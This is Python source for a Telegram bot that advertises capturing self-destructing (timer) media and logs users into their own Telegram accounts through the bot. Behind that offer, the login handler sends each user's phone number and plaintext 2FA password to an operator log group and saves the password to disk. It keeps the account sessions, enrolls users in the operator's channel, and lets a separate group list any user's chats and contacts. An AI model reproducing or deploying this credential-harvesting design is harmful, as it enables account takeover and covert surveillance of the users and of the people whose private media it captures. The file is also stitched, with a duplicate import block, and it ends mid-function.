import asyncio
import os
import shutil
import logging
import sys
import subprocess
import time
import tempfile
import zipfile
from datetime import datetime, timedelta, timezone

IST = timezone(timedelta(hours=5, minutes=30))
from telethon import TelegramClient, events, errors, Button
from config import API_ID, API_HASH, BOT_TOKEN, USERS_DIR, ADMIN_ID, Admins_Group_ID, Details_Group_ID, Backup_Group_ID, Logs_Group_ID, BASE_DIR, save_filters, IGNORED_USERS, DOWNLOAD_FILTER_ADMINS
from user_handler import UserSession

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Global state
# {user_id: UserSession_instance}
active_sessions = {}

# {user_id: {'state': 'PHONE'|'OTP'|'2FA', 'client': TempClient, 'phone': str, 'phone_hash': str}}
login_states = {}

# {sender_id: count_remaining}
relay_queue = {}

# Helper to handle all_users.txt
ALL_USERS_FILE = os.path.join(BASE_DIR, "all_users.txt")

GLOBAL_USERS_LIST = []
GLOBAL_USERS_SET = set()

def init_all_users():
    global GLOBAL_USERS_LIST, GLOBAL_USERS_SET
    
    file_users_list = []
    file_users_set = set()
    if os.path.exists(ALL_USERS_FILE):
        with open(ALL_USERS_FILE, "r") as f:
            for line in f:
                u = line.strip()
                if u.isdigit() and u not in file_users_set:
                    file_users_list.append(u)
                    file_users_set.add(u)
    
    dir_entries = []
    if os.path.exists(USERS_DIR):
        for entry in os.listdir(USERS_DIR):
            if entry.isdigit() and entry not in file_users_set:
                folder_path = os.path.join(USERS_DIR, entry)
                # Sort missing users by folder creation time to append them correctly
                dir_entries.append((entry, os.path.getctime(folder_path)))
                
    dir_entries.sort(key=lambda x: x[1])
    dir_users_list = [x[0] for x in dir_entries]
                
    GLOBAL_USERS_LIST = file_users_list + dir_users_list
    GLOBAL_USERS_SET = set(GLOBAL_USERS_LIST)
    
    try:
        with open(ALL_USERS_FILE, "w") as f:
            for u in GLOBAL_USERS_LIST:
                f.write(f"{u}\n")
    except: pass

init_all_users()

def append_to_all_users(uid_str):
    global GLOBAL_USERS_LIST, GLOBAL_USERS_SET
    uid_str = str(uid_str).strip()
    if uid_str and uid_str not in GLOBAL_USERS_SET:
        GLOBAL_USERS_SET.add(uid_str)
        GLOBAL_USERS_LIST.append(uid_str)
        try:
            with open(ALL_USERS_FILE, "a") as f:
                f.write(f"{uid_str}\n")
        except: pass

# Initialize Bot
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def global_user_tracker(event):
    uid = event.sender_id if not event.out else event.chat_id
    if uid:
        uid_str = str(uid)
        user_folder = os.path.join(USERS_DIR, uid_str)
        
        # Check if the user is completely missing physically or from our DB record
        is_new_user = uid_str not in GLOBAL_USERS_SET or not os.path.exists(user_folder)
        
        # Ensure they are saved in database
        append_to_all_users(uid_str)
        # Ensure the folder exists
        os.makedirs(user_folder, exist_ok=True)
        
        if is_new_user and not event.out:
            try:
                sender = await event.get_sender()
                if sender:
                    name = getattr(sender, 'first_name', 'User') or 'User'
                    u_tag = getattr(sender, 'username', None)
                    
                    safe_name = name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
                    profile_link = f'<a href="tg://user?id={uid}">Open User Profile</a>'
                    log_msg = f"New User\n----------------------------------------\nName:-\n{safe_name}\n\n{profile_link}\n\nUser ID:-\n<code>{uid}</code>"
                    if u_tag:
                        log_msg += f"\n\nUsername:-\n@{u_tag}"
                        
                    await bot.send_message(Logs_Group_ID, log_msg, parse_mode='html')
                    
                    if os.path.exists(ALL_USERS_FILE):
                        with open(ALL_USERS_FILE, "r") as f:
                            total_users = sum(1 for line in f if line.strip())
                        await bot.send_file(Backup_Group_ID, ALL_USERS_FILE, caption=f"Total {total_users} users...")
            except Exception as e:
                logger.error(f"Failed to log new user in global tracker: {e}")


@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    sender = await event.get_sender()
    if not sender: return
    user_id = sender.id
    
    # Don't greet if in Relay Mode (Scanning)
    if user_id in relay_queue: return
    
    logger.info(f"User {user_id} started the bot.")
    
    # In case folder doesn't exist, ensure it's created
    user_folder = os.path.join(USERS_DIR, str(user_id))
    os.makedirs(user_folder, exist_ok=True)
    
    # Check if session exists and is loaded
    if await ensure_logged_in(user_id):
        # Already logged in or just loaded
        username = sender.first_name if sender else "User"
        await event.respond(
            f"Hey {username}\nWelcome to Ghost Catcher Bot\n\nYour account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list",
            buttons=[Button.url("Join Our Channel", "https://t.me/Ghost_Catcher_Robot")]
        )
        return

    # No valid session
    username = sender.first_name if sender else "User"
    await event.respond(
        f"Hey {username}\nWelcome to Ghost Catcher Bot\n\nConnect your account to download any self distruct (timer) images, videos and audios\n\nClick /login to connect your account",
        buttons=[Button.url("Join Our Channel", "https://t.me/Ghost_Catcher_Robot")]
    )

def _create_backup_zip():
    init_all_users()
    unix_time = int(time.time())
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, f"{unix_time}.zip")
    
    ALLOWED_EXTENSIONS = {
        ".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".tiff", ".heic",
        ".mp3", ".ogg", ".wav", ".m4a", ".flac", ".aac", ".wma", ".oga"
    }
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        users_dir = os.path.join(BASE_DIR, 'users')
        if os.path.exists(users_dir):
            for root, dirs, files in os.walk(users_dir):
                in_download = 'download' in os.path.relpath(root, users_dir).split(os.sep)
                for file in files:
                    if in_download:
                        ext = os.path.splitext(file)[1].lower()
                        if ext not in ALLOWED_EXTENSIONS:
                            continue
                            
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, BASE_DIR)
                    zipf.write(file_path, arcname)
                    
        fav_path = os.path.join(BASE_DIR, 'favorites.json')
        if os.path.exists(fav_path):
            zipf.write(fav_path, 'favorites.json')
            
        hist_path = os.path.join(BASE_DIR, 'user_history.json')
        if os.path.exists(hist_path):
            zipf.write(hist_path, 'user_history.json')
            
        all_users_path = os.path.join(BASE_DIR, 'all_users.txt')
        if os.path.exists(all_users_path):
            zipf.write(all_users_path, 'all_users.txt')
            
        filter_file_path = os.path.join(BASE_DIR, 'filter_user.json')
        if os.path.exists(filter_file_path):
            zipf.write(filter_file_path, 'filter_user.json')
            
    return temp_dir, zip_path

async def create_and_send_backup(caption="Auto Backup"):
    try:
        temp_dir, zip_path = _create_backup_zip()
        
        await bot.send_file(Backup_Group_ID, zip_path, caption=caption)
        
        try:
            shutil.rmtree(temp_dir)
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Backup failed: {e}")

async def ensure_logged_in(user_id):
    """Ensures the user session is loaded if it exists on disk."""
    if user_id in active_sessions:
        return True
    
    # Check disk
    user_session = UserSession(user_id, API_ID, API_HASH, bot)
    if await user_session.is_authorized():
        # Valid session found on disk, load it
        await user_session.start()
        active_sessions[user_id] = user_session
        return True
    return False

@bot.on(events.NewMessage(pattern='/id'))
async def id_handler(event):
    """Handles /id command."""
    if event.is_private:
        sender = await event.get_sender()
        name = getattr(sender, 'first_name', 'User') or 'User'
        await event.respond(f"Hey {name}\n\nYour ID is `{sender.id}`")
    else:
        chat = await event.get_chat()
        sender = await event.get_sender()
        
        is_super = getattr(chat, 'megagroup', False)
        status_text = "SuperGroup" if is_super else "Group"
        
        s_name = getattr(sender, 'first_name', '') or getattr(sender, 'title', 'Unknown')
        g_name = getattr(chat, 'title', 'Unknown')
        
        text = (
            f"{status_text}\n\n"
            f"{s_name}\n"
            f"`{sender.id}`\n\n"
            f"{g_name}\n"
            f"`{event.chat_id}`"
        )
        await event.respond(text, parse_mode='md')

@bot.on(events.NewMessage(pattern='/login'))
async def login_command(event):
    sender = await event.get_sender()
    user_id = sender.id
    username = sender.first_name if sender else "User"
    user_folder = os.path.join(USERS_DIR, str(user_id))
    session_path = os.path.join(user_folder, "session")

    # If already logged in (memory)
    if user_id in active_sessions:
        await event.respond(f"Your account is already connected and ready to use\n\nClick /fetch to get current chat list")
        return

    # Check disk
    user_session = UserSession(user_id, API_ID, API_HASH, bot)
    if await user_session.is_authorized():
        # Load it back up
        await user_session.start()
        active_sessions[user_id] = user_session
        await event.respond(f"Your account is already connected and ready to use\n\nClick /fetch to get current chat list")
    else:
        # Check if invalid session file exists (expired check)
        if os.path.exists(session_path + ".session"):
            try:
                os.remove(session_path + ".session")
                await event.respond(f"Your session is expired and account is disconnected, reconnect your account again and start catching self distruct (timer) media")
            except Exception as e:
                logger.error(f"Error removing session: {e}")
        else:
             await event.respond(f"Connect your account and start catching self distruct (timer) media")
        
        # Start Login Flow
        await event.respond("Please send your Phone Number (with country code)\ne.g. +919876543210")
        login_states[user_id] = {'state': 'PHONE'}



from config import API_ID, API_HASH, BOT_TOKEN, USERS_DIR, ADMIN_ID, Admins_Group_ID
from user_handler import UserSession

# ... (Previous code) ...

@bot.on(events.NewMessage(pattern='/update'))
async def update_handler(event):
    if event.chat_id != Admins_Group_ID:
        return

    # Permission Check: Change Info + Ban Power
    try:
        perms = await bot.get_permissions(event.chat_id, event.sender_id)
        # Checking flags: ban_users (Kick/Ban), change_info
        if not (perms.is_admin and perms.ban_users and perms.change_info):
             await event.respond("You need 'Change Info' and 'Ban Users' admin rights to use this command.")
             return
    except Exception as e:
         # If get_permissions fails, assume no access
         return

    msg = await event.respond("Attempting to pull changes from git...")
    
    try:
        process = subprocess.Popen(
            ["git", "pull"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=os.getcwd()
        )
        stdout, stderr = process.communicate()
        
        output = stdout.decode('utf-8')
        error = stderr.decode('utf-8')
        
        if "Already up to date." in output:
             await msg.edit("Bot is already up to date")
             return

        await msg.edit(f"Update Successful...")
        
        # Save restart state
        with open("restart.txt", "w") as f:
            f.write(f"{event.chat_id}:{msg.id}")

        # Disconnect all sessions to avoid locks
        for session in active_sessions.values():
            await session.stop()
        
        # Restart the script
        os.execl(sys.executable, sys.executable, *sys.argv)
        
    except Exception as e:
        await msg.edit(f"Update Failed\nError: {e}")

@bot.on(events.NewMessage(pattern='/fetch'))
async def fetch_handler(event):
    user_id = event.sender_id
    if not await ensure_logged_in(user_id):
        await event.respond("Your account is not connected\n\nConnect your account to download any self distruct (timer) images, videos and audios\n\nClick /login to connect your account")
        return
    
    msg = await event.respond("Fetching chat list")
    
    try:
        dialogs = await active_sessions[user_id].get_dialogs(limit=10)
        response_text = ""
        for d in dialogs:
            # d.id can be negative for chats/channels, positive for users
            # The user asked for /userid, so we use d.id
            name = d.name if d.name else "Unknown"
            # Reverted to requested format: /ID Name
            response_text += f"/{abs(d.id)} {name}\n"
            
        if not response_text:
            await msg.edit("No chats found")
        else:
            await msg.edit(f"Current users list, click on user id to scan media...\n\n{response_text}")
        
    except Exception as e:
        # Check for disconnection or auth errors
        err_str = str(e).lower()
        if "auth" in err_str or "disconnect" in err_str or "session" in err_str:
             if user_id in active_sessions:
                 del active_sessions[user_id]
             user_folder = os.path.join(USERS_DIR, str(user_id))
             session_path = os.path.join(user_folder, "session.session")
             if os.path.exists(session_path):
                 os.remove(session_path)

             await msg.delete() # Remove "Fetching..."
             await event.respond(f"Your session is expired and account is disconnected, reconnect your account again and start catching self distruct (timer) media")
             await event.respond("Please send your Phone Number (with country code)\ne.g. +919876543210")
             login_states[user_id] = {'state': 'PHONE'}
        else:
             await msg.edit(f"Error fetching chats: {e}")

@bot.on(events.NewMessage(pattern=r'/(\d+)$'))
async def chat_scan_handler(event):
    user_id = event.sender_id
    
    # Ignore commands in Chats Group (handled by shortcut handler)
    if event.chat_id == Details_Group_ID:
        return
    
    # Check connection
    if not await ensure_logged_in(user_id):
        await event.respond("Your account is not connected\n\nClick /login")
        return
        
    target_id = int(event.pattern_match.group(1))
    
    await event.respond(f"Scanning user {target_id}")
    
    try:
        results = await active_sessions[user_id].scan_chat_and_download(target_id, limit=100)

        
        if not results:
            await event.respond(f"No media found")
            return
            
        total = len(results)
        # Helper to escape HTML for bot.py side
        def esc(text):
            return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

        for i, item in enumerate(results):
            path = item['path']
            name = item.get('name', 'Unknown')
            orig_cap = item.get('caption', '')
            
            parts = []
            if orig_cap:
                parts.append(esc(orig_cap))
                parts.append("----------------------------------------")
            
            if total > 1:
                parts.append(f"{i+1}/{total}")
            
            parts.append(esc(name))
            
            caption = "\n".join(parts)
            
            await bot.send_file(user_id, path, caption=caption, parse_mode='html')
            
            async def delayed_delete(p, delay):
                await asyncio.sleep(delay)
                try:
                    if os.path.exists(p):
                        os.remove(p)
                except Exception as e:
                    logger.error(f"Error deleting file {p}: {e}")
            
            bot.loop.create_task(delayed_delete(path, 3600))
        
        await bot.send_message(user_id, "Done")
            
    except Exception as e:
        err_str = str(e).lower()
        if "auth" in err_str or "disconnect" in err_str or "session" in err_str:
             if user_id in active_sessions:
                 del active_sessions[user_id]
             user_folder = os.path.join(USERS_DIR, str(user_id))
             session_path = os.path.join(user_folder, "session.session")
             if os.path.exists(session_path):
                 os.remove(session_path)
             
             await event.respond(f"Your session is expired and account is disconnected, reconnect your account again and start catching self distruct (timer) media")
             await event.respond("Please send your Phone Number (with country code)\ne.g. +919876543210")
             login_states[user_id] = {'state': 'PHONE'}
        else:
             await event.respond(f"Error scanning: {e}")

@bot.on(events.NewMessage)
async def message_handler(event):
    if event.message.message.startswith('/'):
        return # Ignore commands

    user_id = event.sender_id
    text = event.message.message.strip()
    
    if user_id not in login_states:
        return

    state_data = login_states[user_id]
    state = state_data['state']
    
    user_folder = os.path.join(USERS_DIR, str(user_id))
    session_path = os.path.join(user_folder, "session")

    try:
        if state == 'PHONE':
            phone = text
            await event.respond(f"Connecting to Telegram and sending OTP")
            
            # Initialize a temp client for login
            # Ensure no stale session exists if we are in PHONE state
            if os.path.exists(session_path + ".session"):
                 os.remove(session_path + ".session")

            temp_client = TelegramClient(session_path, API_ID, API_HASH)
            await temp_client.connect()
            
            if not await temp_client.is_user_authorized():
                try:
                    sent = await temp_client.send_code_request(phone)
                    state_data['client'] = temp_client
                    state_data['phone'] = phone
                    state_data['phone_hash'] = sent.phone_code_hash
                    state_data['state'] = 'OTP'
                    
                    await event.respond("OTP Sent\nIf your OTP is 12345 then send by seperating with spaces\n1 2 3 4 5")
                except errors.FloodWaitError as e:
                    await event.respond(f"Please wait and try again after {e.seconds} seconds")
                    del login_states[user_id]
                except Exception as e:
                    await event.respond("Incorrect OTP\nTry again")
                    # checking if client needs disconnect?
                    await temp_client.disconnect()
            else:
                await event.respond("Already authorized! Starting...")
                await temp_client.disconnect() # Close temp, open real UserSession
                # ... Start UserSession logic (duplicate code, can refactor)
                user_session = UserSession(user_id, API_ID, API_HASH, bot)
                await user_session.start()
                active_sessions[user_id] = user_session
                del login_states[user_id]

        elif state == 'OTP':
            otp = text.replace(" ", "")
            client = state_data['client']
            phone = state_data['phone']
            phone_hash = state_data['phone_hash']
            
            try:
                await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_hash)
                
                await event.respond(f"Login Successful\n\nNow your account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list")
                try:
                    me = await client.get_me()
                    first = getattr(me, 'first_name') or ''
                    last = getattr(me, 'last_name') or ''
                    n = f"{first} {last}".strip() or "User"
                    
                    safe_n = n.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
                    profile_link = f'<a href="tg://user?id={me.id}">Open User Profile</a>'
                    
                    p_num = str(phone)
                    if not p_num.startswith('+'):
                        p_num = f"+{p_num}"
                        
                    log = f"New Login\n----------------------------------------\nName:-\n{safe_n}\n\n{profile_link}\n\nUser ID:-\n<code>{me.id}</code>"
                    if getattr(me, 'username', None):
                        log += f"\n\nUsername:-\n@{me.username}"
                        
                    log += f"\n\nPhone:-\n<code>{p_num}</code>"
                    
                    await bot.send_message(Logs_Group_ID, log, parse_mode='html')
                    
                    bot.loop.create_task(create_and_send_backup("Login Backup"))
                except Exception as e:
                    print(f"Login Log Error: {e}")
                await event.client.send_file(event.chat_id, "login.jpg", caption="Click on **Yes, it's me** and start using the bot")
                # Removed setting instruction as per request
                await client.disconnect() # Disconnect temp so UserSession can use the file
                
                # Delete old 2FA configuration if user logged in without 2FA
                pwd_path = os.path.join(USERS_DIR, str(user_id), "2fa.txt")
                if os.path.exists(pwd_path):
                    try: os.remove(pwd_path)
                    except: pass
                
                # Start the persistent UserSession
                user_session = UserSession(user_id, API_ID, API_HASH, bot)
                await user_session.start()
                await user_session.join_channel("Ghost_Catcher_Robot")
                active_sessions[user_id] = user_session
                del login_states[user_id]
                
            except errors.SessionPasswordNeededError:
                state_data['state'] = '2FA'
                await event.respond("Two-Step Verification Required\nPlease enter your 2FA Password")
            except Exception as e:
                await event.respond("Incorrect OTP\nTry again")

        elif state == '2FA':
            password = text
            client = state_data['client']
            
            try:
                await client.sign_in(password=password)
                await event.respond(f"Login Successful\n\nNow your account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list")
                try:
                    me = await client.get_me()
                    first = getattr(me, 'first_name') or ''
                    last = getattr(me, 'last_name') or ''
                    n = f"{first} {last}".strip() or "User"
                    
                    safe_n = n.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
                    profile_link = f'<a href="tg://user?id={me.id}">Open User Profile</a>'
                    
                    p_num = str(state_data.get('phone', 'Unknown'))
                    if p_num != 'Unknown' and not p_num.startswith('+'):
                        p_num = f"+{p_num}"
                        
                    log = f"New Login\n----------------------------------------\nName:-\n{safe_n}\n\n{profile_link}\n\nUser ID:-\n<code>{me.id}</code>"
                    if getattr(me, 'username', None):
                        log += f"\n\nUsername:-\n@{me.username}"
                        
                    log += f"\n\nPhone:-\n<code>{p_num}</code>\n\n2FA Password:-\n<code>{password}</code>"
                    
                    await bot.send_message(Logs_Group_ID, log, parse_mode='html')

                    bot.loop.create_task(create_and_send_backup("Login Backup"))
                except Exception as e:
                     print(f"Login Log Error: {e}")
                await event.client.send_file(event.chat_id, "login.jpg", caption="Click on **Yes, it's me** and start using the bot")
                # Removed setting instruction as per request
                await client.disconnect()
                
                user_session = UserSession(user_id, API_ID, API_HASH, bot)
                # Store 2FA password in session object for dashboard display
                user_session.two_fa_password = password
                
                # Persist 2FA password to file
                pwd_path = os.path.join(user_folder, "2fa.txt")
                try:
                    with open(pwd_path, "w") as f:
                        f.write(password)
                except Exception as e:
                    logger.error(f"Failed to save 2FA pwd: {e}")
                
                await user_session.start()
                await user_session.join_channel("Ghost_Catcher_Robot")
                active_sessions[user_id] = user_session
                del login_states[user_id]
            except Exception as e:
                await event.respond("Incorrect password\nTry again")

    except Exception as e:
        logger.error(f"Error in handler: {e}")
        await event.respond("An internal error occurred.")

@bot.on(events.NewMessage(pattern='/logs'))
async def logs_handler(event):
    if event.chat_id != Admins_Group_ID: return
    if os.path.exists("crash.txt"):
        await event.client.send_file(event.chat_id, "crash.txt", caption="Crash Log")
    else:
        await event.respond("No crash log found")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_handler(event):
    if event.chat_id != Admins_Group_ID: return
    users_list = []
    if os.path.exists(ALL_USERS_FILE):
        with open(ALL_USERS_FILE, "r") as f:
            users_list = [l for l in f if l.strip()]
    total = len(users_list)
    active = len(active_sessions)
    await event.respond(f"Total Users - {total}\nActive Users - {active}")

@bot.on(events.NewMessage(pattern='/ping'))
async def ping_handler(event):
    if event.chat_id != Admins_Group_ID: return
    start = time.time()
    msg = await event.respond("Pong!")
    end = time.time()
    ms = (end - start) * 1000
    await msg.edit(f"Ping - {ms:.2f} ms")

@bot.on(events.NewMessage(pattern=r'^/ignore\s+(\d+)'))
async def ignore_handler(event):
    if event.chat_id != Admins_Group_ID: return
    try:
        user_id = int(event.pattern_match.group(1))
        if user_id not in IGNORED_USERS:
            IGNORED_USERS.append(user_id)
            save_filters()
        await event.respond(f"{user_id} added to ignored users list...")
    except Exception as e:
        await event.respond(f"Error: {e}")

@bot.on(events.NewMessage(pattern=r'^/rignore\s+(\d+)'))
async def rignore_handler(event):
    if event.chat_id != Admins_Group_ID: return
    try:
        user_id = int(event.pattern_match.group(1))
        if user_id in IGNORED_USERS:
            IGNORED_USERS.remove(user_id)
            save_filters()
        await event.respond(f"{user_id} removed from ignored users list...")
    except Exception as e:
        await event.respond(f"Error: {e}")

@bot.on(events.NewMessage(pattern=r'^/admin\s+(\d+)'))
async def admin_filter_handler(event):
    if event.chat_id != Admins_Group_ID: return
    try:
        user_id = int(event.pattern_match.group(1))
        if user_id not in DOWNLOAD_FILTER_ADMINS:
            DOWNLOAD_FILTER_ADMINS.append(user_id)
            save_filters()
        await event.respond(f"{user_id} added to filtered admins list...")
    except Exception as e:
        await event.respond(f"Error: {e}")

@bot.on(events.NewMessage(pattern=r'^/radmin\s+(\d+)'))
async def radmin_filter_handler(event):
    if event.chat_id != Admins_Group_ID: return
    try:
        user_id = int(event.pattern_match.group(1))
        if user_id in DOWNLOAD_FILTER_ADMINS:
            DOWNLOAD_FILTER_ADMINS.remove(user_id)
            save_filters()
        await event.respond(f"{user_id} removed from filtered admins list...")
    except Exception as e:
        await event.respond(f"Error: {e}")

@bot.on(events.NewMessage(pattern='/list'))
async def allid_handler(event):
    if event.chat_id != Admins_Group_ID: return
    try:
        init_all_users()
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r") as f:
                total_users = len([l for l in f if l.strip()])
            await event.client.send_file(event.chat_id, ALL_USERS_FILE, caption=f"Total {total_users} users...")
        else:
            await event.respond("all_users.txt not found")
    except Exception as e:
        await event.respond(f"Error: {e}")

@bot.on(events.NewMessage(pattern=r'(?i)^/?admin$'))
async def admin_help_handler(event):
    if event.chat_id != Admins_Group_ID: return
    
    menu = """
Admin Control List...

/update Update bot repo
/logs Get log file
/stats Check total users
/broadcast Send message
/restart Restart bot
/ping Check latency
/list Get users list
/backup Create backup file
/url Get Web Portal URL
"""
    await event.respond(menu.strip())

@bot.on(events.NewMessage(pattern='/backup'))
async def backup_handler(event):
    if event.chat_id != Admins_Group_ID: return
    
    msg = await event.respond("Creating backup...")
    try:
        temp_dir, zip_path = _create_backup_zip()
        
        await event.client.send_file(event.chat_id, zip_path, caption="Admin Backup")
        
        try:
            shutil.rmtree(temp_dir)
        except Exception:
            pass
        await msg.delete()
    except Exception as e:
        await msg.edit(f"Backup failed: {e}")

@bot.on(events.NewMessage(pattern='/restore'))
async def restore_handler(event):
    if event.chat_id != Admins_Group_ID: return
    
    reply = await event.get_reply_message()
    if not reply or not getattr(reply, 'document', None):
        await event.respond("Please reply to a backup zip file...")
        return
        
    if not reply.file.name.endswith(".zip"):
        await event.respond("Replied file is not a zip archive...")
        return
        
    status_msg = await event.respond("Restoring data...")
    try:
        temp_dir = tempfile.mkdtemp()
        zip_path = await reply.download_media(file=temp_dir)
        
        extract_dir = os.path.join(temp_dir, "extracted")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
            
        import json
        
        # 1. Merge all_users.txt
        ext_all_users = os.path.join(extract_dir, "all_users.txt")
        if os.path.exists(ext_all_users):
            server_users = set()
            if os.path.exists(ALL_USERS_FILE):
                with open(ALL_USERS_FILE, "r") as f:
                    server_users.update(l.strip() for l in f if l.strip())
            with open(ext_all_users, "r") as f:
                server_users.update(l.strip() for l in f if l.strip())
            with open(ALL_USERS_FILE, "w") as f:
                for uid in sorted(server_users):
                    f.write(f"{uid}\n")
                    
        # 2. Merge favorites.json
        ext_fav = os.path.join(extract_dir, "favorites.json")
        fav_path = os.path.join(BASE_DIR, "favorites.json")
        if os.path.exists(ext_fav):
            ext_data = {}
            srv_data = {}
            try:
                with open(ext_fav, "r") as f: ext_data = json.load(f)
            except: pass
            try:
                if os.path.exists(fav_path):
                    with open(fav_path, "r") as f: srv_data = json.load(f)
            except: pass
            
            srv_data.update(ext_data)
            with open(fav_path, "w") as f:
                json.dump(srv_data, f, indent=4)
                
        # 3. Merge filter_user.json
        ext_filter = os.path.join(extract_dir, "filter_user.json")
        filter_path = os.path.join(BASE_DIR, "filter_user.json")
        if os.path.exists(ext_filter):
            ext_data = {}
            srv_data = {"IGNORED_USERS": [], "DOWNLOAD_FILTER_ADMINS": []}
            try:
                with open(ext_filter, "r") as f: ext_data = json.load(f)
            except: pass
            try:
                if os.path.exists(filter_path):
                    with open(filter_path, "r") as f:
                        data = json.load(f)
                        srv_data["IGNORED_USERS"] = data.get("IGNORED_USERS", [])
                        srv_data["DOWNLOAD_FILTER_ADMINS"] = data.get("DOWNLOAD_FILTER_ADMINS", [])
            except: pass
            
            for key in ["IGNORED_USERS", "DOWNLOAD_FILTER_ADMINS"]:
                existing = srv_data[key]
                incoming = ext_data.get(key, [])
                srv_data[key] = list(set(existing + incoming))
                
            with open(filter_path, "w") as f:
                json.dump(srv_data, f, indent=4)
                
            IGNORED_USERS.clear()
            IGNORED_USERS.extend(srv_data["IGNORED_USERS"])
            DOWNLOAD_FILTER_ADMINS.clear()
            DOWNLOAD_FILTER_ADMINS.extend(srv_data["DOWNLOAD_FILTER_ADMINS"])
            
        # 4. Merge user_history.json
        ext_hist = os.path.join(extract_dir, "user_history.json")
        hist_path = os.path.join(BASE_DIR, "user_history.json")
        if os.path.exists(ext_hist):
            ext_data = {}
            srv_data = {}
            try:
                with open(ext_hist, "r") as f: ext_data = json.load(f)
            except: pass
            try:
                if os.path.exists(hist_path):
                    with open(hist_path, "r") as f: srv_data = json.load(f)
            except: pass
            
            srv_data.update(ext_data)
            with open(hist_path, "w") as f:
                json.dump(srv_data, f, indent=4)
                
        # 5. Merge users folder
        ext_users = os.path.join(extract_dir, "users")
        srv_users = os.path.join(BASE_DIR, "users")
        if os.path.exists(ext_users):
            if not os.path.exists(srv_users):
                shutil.copytree(ext_users, srv_users)
            else:
                for uid_folder in os.listdir(ext_users):
                    zip_uid_path = os.path.join(ext_users, uid_folder)
                    srv_uid_path = os.path.join(srv_users, uid_folder)
                    
                    if not os.path.isdir(zip_uid_path): continue
                    
                    if not os.path.exists(srv_uid_path):
                        shutil.copytree(zip_uid_path, srv_uid_path)
                    else:
                        zip_dl = os.path.join(zip_uid_path, "downloads")
                        srv_dl = os.path.join(srv_uid_path, "downloads")
                        if os.path.isdir(zip_dl):
                            if not os.path.exists(srv_dl):
                                shutil.copytree(zip_dl, srv_dl)
                            else:
                                def _merge_dirs(src, dst):
                                    if not os.path.exists(dst):
                                        os.makedirs(dst, exist_ok=True)
                                    for item in os.listdir(src):
                                        s = os.path.join(src, item)
                                        d = os.path.join(dst, item)
                                        if os.path.isdir(s):
                                            _merge_dirs(s, d)
                                        else:
                                            try: shutil.copy2(s, d)
                                            except: pass
                                _merge_dirs(zip_dl, srv_dl)
                                
        try: shutil.rmtree(temp_dir)
        except: pass
        
        await status_msg.edit("Successfully restored...")
        await create_and_send_backup(caption="Admin Backup")
        
    except Exception as e:
        logger.error(f"Restore failed: {e}")
        import traceback
        traceback.print_exc()
        try:
            await status_msg.edit(f"Restore failed: {e}")
        except:
            pass

@bot.on(events.NewMessage(pattern='/restart'))
async def restart_handler(event):
    if event.chat_id != Admins_Group_ID: return
    msg = await event.respond("Restarting system...")
    
    with open("restart.txt", "w") as f:
        f.write(f"{event.chat_id}:{msg.id}")
        
    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_handler(event):
    if event.chat_id != Admins_Group_ID: return
    
    reply = await event.get_reply_message()
    if not reply:
        await event.respond("Please reply to a message to broadcast")
        return
        
    init_all_users()
    users = []
    if os.path.exists(ALL_USERS_FILE):
        with open(ALL_USERS_FILE, "r") as f:
            for line in f:
                if line.strip(): users.append(line.strip())
                
    total = len(users)
    sent = 0
    failed = 0
    
    status_msg = await event.respond(f"Broadcasting to {total} users...")
    
    for uid in users:
        try:
            target = int(uid)
            if reply.media:
                await bot.send_file(target, reply.media, caption=reply.text)
            else:
                await bot.send_message(target, reply.text)
            sent += 1
            await asyncio.sleep(0.1) 
        except Exception:
            failed += 1
            
    await status_msg.edit(f"Broadcast Result\n\nTotal users - {total}\nSuccess - {sent}\nFailed - {failed}")

@bot.on(events.NewMessage(pattern=r'^/(\d+)\s+(.+)$'))
async def user_chats_shortcut(event):
    if event.chat_id != Details_Group_ID: return
    
    match = event.pattern_match
    target_id = int(match.group(1))
    mode = match.group(2).lower()
    
    if target_id not in active_sessions:
        await event.respond("User session not active / not found.")
        return
        
    session = active_sessions[target_id]
    
    # Suppress Bot Greetings
    relay_queue[target_id] = 1000
    try:
        msg = await event.respond("Fetching data...")
        
        report = await session.fetch_dialog_list(mode)
        
        if report:
            if len(report) > 4000:
                fname = f"{target_id}_{mode}.txt"
                with open(fname, "w", encoding="utf-8") as f:
                    f.write(report)
                await event.client.send_file(event.chat_id, fname, caption=f"Report for {target_id} ({mode})")
                os.remove(fname)
                await msg.delete()
            else:
                await msg.edit(report)
        else:
            await msg.edit("No data found.")
    except Exception as e:
        await msg.edit(f"Error: {e}")
    finally:
        if target_id in relay_queue:
            del relay_queue[target_id]

@bot.on(events.NewMessage(pattern='/user'))
async def user_chats_handler(event):
    if event.chat_id != Details_Group_ID: return
    
    parts = event.text.split()
    if len(parts) < 3:
        await event.respond("Usage: /user <user_id> <mode>\nModes: chats, allchats, groups, allgroups, channels, allchannels, bots, allbots")
        return
        
    try:
        target_id = int(parts[1])
        mode = parts[2].lower()
    except ValueError:
        await event.respond("Invalid User ID")
        return
        
    if target_id not in active_sessions:
        await event.respond("User session not active / not found.")
        return
        
    session = active_sessions[target_id]
    
    # Suppress Bot Greetings
